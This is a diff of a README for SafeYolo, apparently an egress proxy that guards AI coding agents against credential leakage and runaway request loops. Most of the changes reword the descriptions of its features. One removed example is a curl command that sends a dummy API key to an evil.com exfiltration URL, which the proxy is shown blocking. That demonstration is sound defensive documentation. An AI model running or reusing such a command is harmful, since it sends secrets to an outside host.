@@ -44,7 +44,7 @@ docker logs -f safeyolo 2>&1 | python scripts/logtail.py
 
 ## Block-by-Default for Core Protections
 
-SafeYolo runs in **block mode by default** for credential guard and rate limiting - violations are blocked immediately to prevent credential leakage and runaway loops:
+SafeYolo runs in **block mode by default** for credential guard and rate limiting:
 - **Credential guard scans HTTP headers by default** - low false positive rate
 - **Rate limits are generous** - 10 req/sec default, 50 req/sec for LLM APIs (600+ requests/min)
 - **Easy to disable for development** - `--set credguard_block=false --set ratelimit_block=false`
@@ -126,7 +126,7 @@ SafeYolo is egress control for the API economy:
 ### Trust, But Verify
 
 Use AI agents with intentional constraints:
-- **Block credential leakage and runaway loops by default** - these cause immediate, measurable damage
+- **Fail closed for high-risk operations** - violations that cause immediate damage (wrong-host credential routing, runaway loops) are blocked by default
 - **Make exceptions easy** - temp allowlist, admin API, runtime mode toggling
 - **LLM-friendly error messages** - the agent learns from blocks, not just fails silently
 - **Catch accidents, not APTs** - Focus on hallucinations, typosquats, and configuration errors, not sophisticated attacks
@@ -318,14 +318,6 @@ SafeYolo includes 11 addons for security, reliability, and observability: 9 in t
 
 ### Quick Examples
 
-**Credential Guard** - Blocks OpenAI key to wrong host:
-```bash
-curl -x http://localhost:8888 \
-  -H "Authorization: Bearer sk-test1234567890abcdefghijklmnopqrstuvwxyz123456" \
-  https://evil.com/exfiltrate
-# → 403 CREDENTIAL ROUTING ERROR
-```
-
 **Rate Limiter** - Prevents runaway loops:
 ```bash
 # LLM tries 100 req/sec to api.openai.com
@@ -380,12 +372,7 @@ SafeYolo's primary use case is as an internet chokepoint for AI coding assistant
                                          Internet
 ```
 
-All traffic routes through SafeYolo, which:
-- Blocks credential leakage to wrong domains
-- Rate limits to prevent IP blacklisting
-- Circuit breaks failing services
-- Logs everything for audit
-- Allows legitimate API calls through
+All traffic routes through SafeYolo for credential routing, rate limiting, circuit breaking, and audit logging.
 
 ### Setup Option 1: Claude Code in a Container (Recommended)
 
